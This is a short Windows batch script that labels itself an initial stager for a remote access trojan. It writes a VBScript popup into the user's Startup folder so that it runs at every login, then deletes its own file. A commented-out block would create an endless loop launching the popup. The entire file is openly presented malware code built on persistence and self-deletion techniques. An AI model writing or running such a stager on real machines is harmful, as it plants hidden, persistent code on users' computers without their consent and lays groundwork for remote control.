@echo off
@REM initial stager for RAT

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directory 
cd %STARTUP%

@REM write payloads to startup
(
    echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title"
) > popup.vbs

@REM cd back into initial location
cd "%INITIALPATH%"
del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM ) > payload.cmd